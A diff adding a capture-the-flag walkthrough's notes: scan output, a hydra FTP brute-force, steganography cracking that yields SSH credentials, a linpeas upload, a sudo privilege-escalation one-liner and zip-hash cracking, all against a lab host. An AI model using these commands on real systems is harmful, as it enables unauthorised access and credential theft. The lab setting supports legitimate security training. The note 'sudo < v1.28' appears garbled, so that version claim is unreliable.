@@ -1,0 +1,112 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 12:05 CEST
+Nmap scan report for 10.10.115.119
+Host is up (0.036s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
+|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
+|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Annoucement
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=4/25%OT=21%CT=1%CU=35257%PV=Y%DS=2%DC=T%G=Y%TM=6447A60
+OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)OPS
+OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
+OS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT      ADDRESS
+1   35.34 ms 10.9.0.1
+2   35.48 ms 10.10.115.119
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.47 seconds
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.115.119
++ Target Hostname:    10.10.115.119
++ Target Port:        80
++ Start Time:         2023-04-25 12:06:21 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ 8074 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2023-04-25 12:12:41 (GMT2) (380 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.115.119
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/04/25 12:08:15 Starting gobuster in directory enumeration mode
+===============================================================
+===============================================================
+2023/04/25 12:22:43 Finished
+===============================================================
+
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.115.119 -t 30
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-25 12:47:04
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
+[DATA] attacking ftp://10.10.115.119:21/
+[21][ftp] host: 10.10.115.119   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-25 12:47:40
+
+
+downloaded stegseek from: https://github.com/RickdeJager/stegseek/releases to crack the passphrases of the steg in the jpg and png files
+
+passphrase for the jpg: Area51 
+
+the hidden message revealed the following ssh login data: james:hackerrules!
+
+downloaded another jpg from james's ssh, using scp: scp james@10.10.23.97:/home/james/Alien_autospy.jpg .
+
+did a reverse image search for the name of the incident: Roswell Alien Autopsy
+
+uploaded linpeas to james's SSH via the python http.server module and ran it to find priv esc vectors
+
+found sudo at version 1.8.21p2 which is probably vulnerable.
+
+gained a root shell with the command: sudo -u#-1 /bin/bash (works for sudo < v1.28)
+
+also we figured out now that there is a hidden zip file inside of the png file, which we can find with binwalk
+
+we can get it out of there withthe command: binwalk --run-as=root -e cutie.png
+
+now to get the password for this zip file we use zip2john as follows: zip2john 8702.zip > zip_hash.txt
+
+lastly we crack the password with rockyou and john: john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
+
+and we retrieve the password: alien
